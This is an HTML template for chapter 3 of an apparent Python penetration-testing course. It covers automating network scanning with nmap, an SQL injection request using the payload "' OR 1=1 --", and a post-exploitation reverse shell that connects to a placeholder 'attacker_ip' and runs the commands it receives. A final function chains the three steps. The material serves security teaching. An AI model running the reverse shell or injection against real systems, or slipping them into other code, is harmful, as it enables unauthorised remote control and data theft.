<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Chapter 3</title>
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            height: 100%;
            font-family: Arial, sans-serif;
        }

        .container {
            display: flex;
            flex-direction: row;
            height: 100%;
        }

        .sidebar {
            width: 250px;
            background-color: #f8f9fa;
            padding: 20px;
            border-right: 1px solid #ddd;
            position: sticky;
            top: 0;
            height: 100%;
            overflow-y: auto;
        }

        .chapter-list {
            margin-left: 20px;
            flex: 0 0 250px;
            padding-right: 20px;
            border-right: 1px solid #ddd;
        }

        .main-content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
            background-color: #fff;
            height: 100vh;
        }

        .chapter-list h3 {
            margin-bottom: 10px;
        }

        .chapter-list ul {
            list-style: none;
            padding: 0;
        }

        .chapter-list ul li {
            margin-bottom: 10px;
        }

        .chapter-list ul li a {
            text-decoration: none;
            color: #007BFF;
            font-size: 16px;
        }

        .chapter-list ul li a:hover {
            text-decoration: underline;
        }

        .chapter-list ul li.active a {
            font-weight: bold;
            color: #0056b3;
        }

        .main-content h1 {
            font-size: 28px;
            color: #333;
        }

        .main-content h2 {
            font-size: 24px;
            color: #555;
            margin-top: 70px;
        }

        .main-content p {
            font-size: 18px;
            color: #666;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .next-chapter {
            text-align: center;
            margin-top: 40px;
        }

        .next-chapter-button {
            display: inline-block;
            padding: 10px 20px;
            background-color: #FFC107;
            color: #003366;
            text-decoration: none;
            font-size: 18px;
            border-radius: 5px;
            font-weight: bold;
            margin-top: 20px;
        }

        .next-chapter-button:hover {
            background-color: #e0a800;
        }
    </style>
</head>

<body>
    @extends('layout')

    @section('content')
    <div class="container">

        <div class="chapter-list">
            <h3>CHAPTERS</h3>
            <ul>
                <li><a href="/lessons/pfc/pfc01">Chapter 1: Introduction to Python for Security Tasks</a></li>
                <li><a href="/lessons/pfc/pfc02">Chapter 2: Network Scanning and Reconnaissance with Python</a></li>
                <li class="active"><a href="/lessons/pfc/pfc03">Chapter 3: Automating Penetration Testing Tasks</a></li>
                <li><a href="/lessons/pfc/pfc04">Chapter 4: Creating Security Tools and Scripts</a></li>
                <li><a href="/lessons/pfc/pfc05">Chapter 5: Building Python-Based Exploits and Payloads</a></li>
            </ul>
        </div>

        <div class="main-content">
            <h1>Chapter 3: Automating Penetration Testing Tasks</h1>

            <h2>Learning Objectives</h2>
            <ul style="list-style-type: disc; margin-left: 20px;">
                <li>Learn how to automate penetration testing tasks using Python</li>
                <li>Understand the role of Python in penetration testing</li>
                <li>Automate scanning, exploitation, and post-exploitation tasks</li>
                <li>Build Python scripts to streamline penetration testing workflows</li>
            </ul>

            <h2>1. Introduction to Penetration Testing Automation</h2>
            <p>
                Penetration testing is a critical part of cybersecurity that involves simulating attacks on systems to identify vulnerabilities. Automating penetration testing tasks can help speed up the process, increase efficiency, and ensure that tests are thorough and consistent. Python is a great tool for automating these tasks, and in this chapter, we will explore how to write scripts for automated penetration testing.
            </p>

            <h2>2. Automating Network Scanning</h2>
            <p>
                Network scanning is one of the first tasks in a penetration test. By automating this process, you can quickly identify active hosts, open ports, and services without manually running the scans. Using libraries such as <code>scapy</code> and <code>nmap</code>, you can create scripts to automate network scanning.
            </p>
            <pre>
import nmap

def scan_network(target_ip):
    nm = nmap.PortScanner()
    nm.scan(target_ip, '22-1024')  # Scan ports 22 to 1024
    print(nm.all_hosts())
    for host in nm.all_hosts():
        print(f"Host: {host} | Status: {nm[host].state()}")
        print(f"Open Ports: {nm[host].all_tcp()}")
        
# Example usage: Scan the 192.168.1.0/24 network
scan_network("192.168.1.0/24")
            </pre>

            <h2>3. Automating Exploitation Tasks</h2>
            <p>
                Once vulnerabilities are identified, it's time to exploit them. Automating exploitation can involve creating Python scripts to perform tasks like exploiting buffer overflows, SQL injection, or remote code execution. Libraries such as <code>requests</code> and <code>paramiko</code> can be useful for automating these attacks.
            </p>
            <pre>
import requests

def exploit_sql_injection(target_url, payload):
    response = requests.get(target_url + payload)
    if "error" in response.text:
        print("Exploit Failed")
    else:
        print("Exploit Successful")
        
# Example usage: SQL Injection exploit
target_url = "http://example.com/vulnerable_page?id="
payload = "' OR 1=1 --"
exploit_sql_injection(target_url, payload)
            </pre>

            <h2>4. Automating Post-Exploitation Tasks</h2>
            <p>
                Post-exploitation tasks include things like establishing a backdoor or maintaining access to a compromised system. With Python, you can automate these tasks by writing scripts to perform actions such as creating a reverse shell or extracting sensitive data.
            </p>
            <pre>
import socket
import subprocess

def reverse_shell():
    # Connect back to the attacker's machine
    server_ip = "attacker_ip"
    server_port = 1234
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server_ip, server_port))
    
    while True:
        # Receive commands from the attacker and execute them
        data = s.recv(1024)
        if data == b"exit":
            break
        output = subprocess.run(data.decode(), shell=True, capture_output=True)
        s.send(output.stdout)
        
reverse_shell()
            </pre>

            <h2>5. Writing a Penetration Testing Automation Framework</h2>
            <p>
                By combining the tasks mentioned above, you can write a comprehensive automation framework for penetration testing. This framework can help you automate various stages of the testing process, from reconnaissance to exploitation and post-exploitation.
            </p>
            <pre>
def automate_pen_test(target_ip):
    # Network scan
    scan_network(target_ip)
    
    # Exploit vulnerabilities
    exploit_sql_injection("http://example.com/vulnerable_page?id=", "' OR 1=1 --")
    
    # Post-exploitation (reverse shell)
    reverse_shell()

# Example usage: Automate penetration test on target
automate_pen_test("192.168.1.10")
            </pre>

            <div class="next-chapter">
                <a href="/{{$mark_chapter()}}" class="next-chapter-button">Next Chapter</a>
            </div>
        </div>
    </div>

    @endsection
</body>

</html>